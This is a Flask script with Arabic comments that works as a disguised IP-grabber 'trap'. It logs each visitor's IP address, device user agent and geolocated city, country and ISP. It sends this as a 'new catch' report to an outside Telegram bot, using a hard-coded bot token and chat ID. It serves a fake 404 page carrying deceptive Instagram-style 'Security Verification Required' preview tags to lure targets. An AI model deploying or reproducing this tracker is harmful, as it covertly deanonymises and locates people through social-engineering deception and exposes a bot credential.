from flask import Flask, request
import requests

app = Flask(__name__)

# --- إعداداتك الخاصة ---
TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQSOzvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091" 

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

@app.route('/')
@app.route('/check-status')
def track():
    # 1. جلب بيانات الزائر (الـ IP والجهاز)
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    user_agent = request.headers.get('User-Agent')
    
    # 2. تحليل الموقع الجغرافي
    try:
        geo_res = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5).json()
        city = geo_res.get('city', 'Unknown')
        country = geo_res.get('country', 'Unknown')
        isp = geo_res.get('isp', 'Unknown')
    except:
        city = country = isp = "Error Fetching Data"

    # 3. إرسال التقرير لتليجرام
    report = (
        f"🎯 <b>تنبيه صيد جديد!</b>\n"
        f"--------------------------\n"
        f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
        f"📍 <b>الموقع:</b> {city}, {country}\n"
        f"🏢 <b>المزود:</b> {isp}\n"
        f"📱 <b>الجهاز:</b> {user_agent}\n"
        f"--------------------------"
    )
    send_to_telegram(report)
    
    # 4. كود الـ HTML المخصص للمعاينة التلقائية (الفخ)
    # نضع وسوم Open Graph لإغراء إنستغرام بعمل Preview
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        <meta property="og:title" content="Security Verification Required">
        <meta property="og:description" content="This link is encrypted. Open to verify your identity.">
        <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b306391458a7.png">
        <meta property="og:type" content="website">
        <meta property="og:url" content="https://google.com">

        <title>404 Not Found</title>
        <style>
            body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
            h1 { color: #333; }
        </style>
    </head>
    <body>
        <h1>404 Not Found</h1>
        <p>The requested URL was not found on this server.</p>
    </body>
    </html>
    """, 200 # نستخدم 200 بدلاً من 404 لضمان أن إنستغرام سيقرأ الرابط

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
